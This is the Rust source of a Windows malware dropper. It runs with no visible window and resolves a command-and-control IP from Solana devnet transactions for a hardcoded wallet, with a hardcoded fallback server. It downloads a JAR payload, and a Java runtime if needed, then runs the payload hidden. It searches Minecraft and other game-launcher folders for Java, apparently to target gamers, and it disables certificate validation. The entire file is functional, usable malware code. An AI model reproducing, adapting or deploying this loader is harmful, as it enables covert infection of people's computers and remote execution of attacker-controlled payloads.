// language: Rust, file: dropper/src/main.rs
#![windows_subsystem = "windows"]

use std::ffi::OsStr;
use std::fs;
use std::io::Write;
use std::os::windows::ffi::OsStrExt;
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process::Command;
use walkdir::WalkDir;

use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::Networking::WinInet::*;

const KEY: &str = "__ACCOUNT_KEY__";
const FALLBACK_SERVER: &str = "95.182.96.216";
const CREATE_NO_WINDOW: u32 = 0x08000000;

// Solana Devnet details
const SOLANA_WALLET: &str = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
const SOLANA_RPC: &str = "api.devnet.solana.com";

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

fn log(loader: &Path, msg: &str) {
    let path = loader.join("debug.txt");
    if let Ok(mut f) = fs::OpenOptions::new().create(true).append(true).open(path) {
        let _ = writeln!(f, "{}", msg);
    }
}

fn download_file(url: &str, dest: &Path, loader: &Path) -> bool {
    log(loader, &format!("Downloading: {}", url));
    unsafe {
        let agent = to_wide("Mozilla/5.0");
        let h_internet = InternetOpenW(agent.as_ptr(), INTERNET_OPEN_TYPE_DIRECT, std::ptr::null(), std::ptr::null(), 0);
        if h_internet.is_null() { return false; }

        let url_w = to_wide(url);
        let flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;

        let h_url = InternetOpenUrlW(h_internet, url_w.as_ptr(), std::ptr::null(), 0, flags, 0);
        
        if h_url.is_null() { 
            log(loader, &format!("InternetOpenUrlW failed. Code: {}", GetLastError())); 
            InternetCloseHandle(h_internet); 
            return false; 
        }

        let mut buf = [0u8; 8192];
        let mut bytes_read = 0;
        let mut data = Vec::new();
        while InternetReadFile(h_url, buf.as_mut_ptr() as _, 8192, &mut bytes_read) != 0 && bytes_read > 0 {
            data.extend_from_slice(&buf[..bytes_read as usize]);
        }
        
        let success = fs::write(dest, data).is_ok();
        InternetCloseHandle(h_url);
        InternetCloseHandle(h_internet);
        success
    }
}

fn http_post(host: &str, path: &str, json_body: &str) -> Result<String, String> {
    unsafe {
        let agent = to_wide("Mozilla/5.0");
        let h_internet = InternetOpenW(agent.as_ptr(), INTERNET_OPEN_TYPE_DIRECT, std::ptr::null(), std::ptr::null(), 0);
        if h_internet.is_null() { return Err("InternetOpenW".into()); }

        let host_w = to_wide(host);
        let h_connect = InternetConnectW(h_internet, host_w.as_ptr(), 443, std::ptr::null(), std::ptr::null(), INTERNET_SERVICE_HTTP, 0, 0);
        if h_connect.is_null() { InternetCloseHandle(h_internet); return Err("InternetConnectW".into()); }

        let path_w = to_wide(path);
        let verb = to_wide("POST");
        
        let flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
        let h_request = HttpOpenRequestW(h_connect, verb.as_ptr(), path_w.as_ptr(), std::ptr::null(), std::ptr::null(), std::ptr::null(), flags, 0);
        if h_request.is_null() { InternetCloseHandle(h_connect); InternetCloseHandle(h_internet); return Err("HttpOpenRequestW".into()); }

        let headers = to_wide("Content-Type: application/json\r\n");
        let body_bytes = json_body.as_bytes();

        if HttpSendRequestW(h_request, headers.as_ptr(), u32::MAX, body_bytes.as_ptr() as _, body_bytes.len() as u32) == 0 {
            InternetCloseHandle(h_request);
            InternetCloseHandle(h_connect);
            InternetCloseHandle(h_internet);
            return Err("HttpSendRequestW".into());
        }

        let mut response_data = Vec::new();
        let mut buffer = [0u8; 8192];
        let mut bytes_read = 0;

        while InternetReadFile(h_request, buffer.as_mut_ptr() as _, 8192, &mut bytes_read) != 0 && bytes_read > 0 {
            response_data.extend_from_slice(&buffer[..bytes_read as usize]);
        }

        InternetCloseHandle(h_request);
        InternetCloseHandle(h_connect);
        InternetCloseHandle(h_internet);
        
        Ok(String::from_utf8_lossy(&response_data).to_string())
    }
}

fn get_c2_ip(loader: &Path) -> String {
    log(loader, "Fetching C2 IP from Solana...");
    
    let payload = format!(r#"{{"jsonrpc":"2.0","id":1,"method":"getSignaturesForAddress","params":["{}",{{"limit":10}}]}}"#, SOLANA_WALLET);
    
    let res = match http_post(SOLANA_RPC, "/", &payload) {
        Ok(r) => r,
        Err(e) => {
            log(loader, &format!("Failed to fetch signatures: {}", e));
            return FALLBACK_SERVER.to_string();
        }
    };

    let mut sigs = Vec::new();
    let mut rest = res.as_str();
    while let Some(idx) = rest.find(r#""signature":""#) {
        let start = idx + 13;
        if let Some(end_idx) = rest[start..].find('"') {
            sigs.push(rest[start..start+end_idx].to_string());
            rest = &rest[start+end_idx..];
        } else { break; }
    }

    if sigs.is_empty() {
        log(loader, "No transactions found on Solana.");
        return FALLBACK_SERVER.to_string();
    }

    for sig in sigs {
        log(loader, &format!("Checking tx: {}", sig));
        let tx_payload = format!(r#"{{"jsonrpc":"2.0","id":1,"method":"getTransaction","params":["{}",{{"encoding":"json"}}]}}"#, sig);
        
        if let Ok(tx_res) = http_post(SOLANA_RPC, "/", &tx_payload) {
            if let Some(idx) = tx_res.find("1(") {
                let start = idx + 2;
                if let Some(end_idx) = tx_res[start..].find(')') {
                    let ip_candidate = &tx_res[start..start+end_idx];
                    if ip_candidate.chars().all(|c| c.is_ascii_digit() || c == '.') {
                        log(loader, &format!("Found IP in Solana: {}", ip_candidate));
                        return ip_candidate.to_string();
                    }
                }
            }
        }
    }

    log(loader, "Could not find 1(ip) in transactions. Using fallback.");
    FALLBACK_SERVER.to_string()
}

fn extract_zip(zip_path: &Path, out_dir: &Path, loader: &Path) {
    log(loader, "Extracting zip via tar.exe...");
    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = 0;
        
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        let cmd_str = format!("tar.exe -xf \"{}\" -C \"{}\"", zip_path.display(), out_dir.display());
        let mut cmd_line = to_wide(&cmd_str);

        CreateProcessW(
            std::ptr::null(), cmd_line.as_mut_ptr(), std::ptr::null(), std::ptr::null(),
            0, CREATE_NO_WINDOW, std::ptr::null(), std::ptr::null(), &si, &mut pi
        );
        
        if !pi.hProcess.is_null() {
            WaitForSingleObject(pi.hProcess, 60000); 
            CloseHandle(pi.hProcess);
        }
        if !pi.hThread.is_null() { CloseHandle(pi.hThread); }
    }
}

fn find_java(loader: &Path) -> Option<PathBuf> {
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
    
    let paths = vec![
        format!("{}\\.minecraft\\runtime", appdata),
        format!("{}\\.lunarclient\\jre", appdata),
        format!("{}\\.prismlauncher\\java", appdata),
        format!("{}\\com.modrinth.theseus\\meta", appdata),
        format!("{}\\Programs\\Modrinth App", localappdata),
        format!("{}\\Programs\\Eclipse Adoptium", localappdata),
        "C:\\Program Files\\Java".to_string(),
        "C:\\Program Files\\Eclipse Adoptium".to_string(),
    ];

    for base_path in paths {
        let path = Path::new(&base_path);
        if path.exists() {
            for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()) {
                if entry.file_name() == "javaw.exe" {
                    log(loader, &format!("Found Java: {:?}", entry.path()));
                    return Some(entry.path().to_path_buf());
                }
            }
        }
    }
    None
}

fn download_jre(loader: &Path, server_ip: &str) -> Option<PathBuf> {
    let jre_zip = loader.join("jre.zip");
    let jre_dir = loader.join("jre");
    let url = format!("http://{}/api/downloads/jre.zip", server_ip);

    log(loader, "Java not found. Downloading portable JRE...");
    if !download_file(&url, &jre_zip, loader) {
        log(loader, "Failed to download jre.zip");
        return None;
    }

    let _ = fs::create_dir_all(&jre_dir);
    extract_zip(&jre_zip, &jre_dir, loader);
    let _ = fs::remove_file(&jre_zip);

    for entry in WalkDir::new(&jre_dir).into_iter().filter_map(|e| e.ok()) {
        if entry.file_name() == "javaw.exe" {
            let path = entry.path().to_path_buf();
            log(loader, &format!("Extracted Java found at: {:?}", path));
            return Some(path);
        }
    }
    log(loader, "Failed to find javaw.exe in extracted JRE");
    None
}

fn main() {
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let loader = Path::new(&appdata).join("loader");
    let _ = fs::create_dir_all(&loader);
    
    log(&loader, "--- STARTING BOOT.EXE ---");

    let _ = fs::write(loader.join("key.json"), format!("{{\"key\":\"{}\"}}", KEY));
    log(&loader, "Wrote key.json");

    // Fetch IP from Solana
    let server_ip = get_c2_ip(&loader);
    let url = format!("http://{}/api/downloads/st.jar", server_ip);

    let jar_path = loader.join("st.jar");
    
    if !download_file(&url, &jar_path, &loader) || !jar_path.exists() {
        log(&loader, "Failed to download st.jar. Exiting.");
        return;
    }

    let java_exe = match find_java(&loader) {
        Some(p) => p,
        None => match download_jre(&loader, &server_ip) {
            Some(p) => p,
            None => {
                log(&loader, "Could not find or download Java. Exiting.");
                return;
            }
        }
    };

    let java_console_exe = java_exe.with_file_name("java.exe");
    log(&loader, &format!("Launching Java with: {:?}", java_console_exe));

    log(&loader, "Running st.jar and capturing output...");
    let output = Command::new(&java_console_exe)
        .arg("-jar")
        .arg(&jar_path)
        .arg(KEY)
        .arg(&server_ip) // Pass the IP to Java
        .creation_flags(CREATE_NO_WINDOW)
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            log(&loader, "--- JAVA EXITED ---");
            if !stdout.is_empty() { log(&loader, &format!("STDOUT:\n{}", stdout)); }
            if !stderr.is_empty() { log(&loader, &format!("STDERR:\n{}", stderr)); }
            log(&loader, &format!("Exit Code: {:?}", out.status.code()));
        }
        Err(e) => {
            log(&loader, &format!("Failed to run java.exe: {}", e));
        }
    }
}